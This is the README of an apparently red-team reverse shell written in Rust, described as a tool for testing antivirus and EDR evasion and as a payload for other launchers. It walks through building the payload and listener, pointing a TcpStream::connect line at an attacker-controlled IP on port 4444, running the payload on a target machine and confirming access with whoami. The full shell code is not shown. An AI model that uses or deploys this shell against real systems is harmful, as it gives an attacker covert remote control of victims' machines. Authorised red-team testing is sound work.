## 🔁 Simple Reverse Shell Program in Rust

### Purpose

1. Serve as a test tool for red teaming scenarios
2. Test evasion of antivirus (AV) and endpoint detection & response (EDR) tools
3. Use as a payload for **StegLauncher** and **MissionEvasion**

---

### Development & Usage

#### Pre-conditions:

1. **Install `rustup` to set up the Rust development environment:**

   ```bash
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   ```

   Add the following directory to your `PATH`:

   ```bash
   $HOME/.cargo/bin
   ```

2. **Clone this project:**

   ```bash
   git clone https://github.com/Amaris-Genie-Email-Gateway/ReverseShell
   cd ReverseShell
   ```

---

#### Usage:

1. **Edit the hardcoded IP address**:

   * Open:
     `src/bin/reverseshell_payload.rs`
   * Change the IP to your **listening host** and **port**:

   ```rust
   TcpStream::connect("<your_ip>:4444")
   ```

2. **Build the payload and listener**:

   ```bash
   cargo build --bin reverseshell_payload
   cargo build --bin reverseshell_listener
   ```

3. **Run the payload on the target machine**, and the listener on your local (attacker) machine.

4. **If the connection is successful**, you can run:

   ```bash
   whoami
   ```

   to verify that the reverse shell is active.

---

### Disclaimer

This program is **strictly intended for red teaming and educational use in controlled environments**.
**Any unauthorized use on systems without explicit permission is illegal and strictly forbidden.**
